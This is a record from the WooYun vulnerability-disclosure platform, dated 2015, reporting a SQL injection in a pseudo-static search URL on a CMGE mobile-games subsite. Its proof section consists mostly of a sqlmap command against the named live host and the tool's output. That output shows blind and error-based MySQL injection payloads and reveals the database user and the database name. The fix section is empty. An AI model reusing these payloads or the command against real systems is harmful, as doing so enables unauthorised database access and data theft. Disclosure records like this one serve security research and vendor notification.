{"id": 76325, "wybug_id": "wooyun-2015-0165192", "wybug_title": "中手游某分站伪静态SQL注入漏洞", "wybug_corp": "中手游移动科技有限公司", "wybug_author": "路人甲", "wybug_date": "2015-12-30 10:09", "wybug_open_date": "2016-02-12 18:49", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["字符类型注射"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-12-30：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2016-02-12：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 中国手游娱乐集团有限公司（简称CMGE中国手游）是国际领先的移动游戏开发商与发行商，专注于移动游戏的开发及发行。CMGE中国手游于2012年9月25日登陆美国纳斯达克(NASDAQ:CMGE)，CMGE中国手游是国内首家登陆纳斯达克的手机游戏公司。 详细说明：  http://kf.shengli.com/search/index/keyword/23*/p/2.html   漏洞证明：  \npython sqlmap.py -u \"http://kf.shengli.com/search/index/keyword/23*/p/2.html\" --dbs  --current-user         _ ___ ___| |_____ ___ ___  {1.0-dev-nongit-20150907}|_ -| . | |     | .'| . ||___|_  |_|_|_|_|__,|  _|      |_|           |_|   http://sqlmap.org[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program[*] starting at 15:31:33custom injection marking character ('*') found in option '-u'. Do you want to process it? [Y/n/q] y[15:31:34] [INFO] resuming back-end DBMS 'mysql' [15:31:34] [INFO] testing connection to the target URLsqlmap resumed the following injection point(s) from stored session:---Parameter: #1* (URI)    Type: boolean-based blind    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause    Payload: http://kf.shengli.com:80/search/index/keyword/23'||(SELECT 'ZhbX' FROM DUAL WHERE 3281=3281 RLIKE (SELECT (CASE WHEN (2908=2908) THEN 23 ELSE 0x28 END)))||'/p/2.html    Type: error-based    Title: MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)    Payload: http://kf.shengli.com:80/search/index/keyword/23'||(SELECT 'jjpR' FROM DUAL WHERE 6570=6570 AND EXTRACTVALUE(9129,CONCAT(0x5c,0x717a767671,(SELECT (ELT(9129=9129,1))),0x716b7a7a71)))||'/p/2.html---[15:31:35] [INFO] the back-end DBMS is MySQLweb application technology: Nginxback-end DBMS: MySQL 5.1[15:31:35] [INFO] fetching current user[15:31:35] [INFO] retrieved: db_oss@10.10.%.%current user:    'db_oss@10.10.%.%'[15:31:35] [INFO] fetching database names[15:31:36] [WARNING] reflective value(s) found and filtering out[15:31:36] [WARNING] the SQL query provided does not return any output[15:31:36] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'[15:31:36] [INFO] fetching number of databases[15:31:36] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval[15:31:36] [INFO] retrieved: [15:31:36] [ERROR] unable to retrieve the number of databases[15:31:36] [INFO] falling back to current database[15:31:36] [INFO] fetching current database[15:31:36] [INFO] resumed: ossavailable databases [1]:[*] oss\n   修复方案：     版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}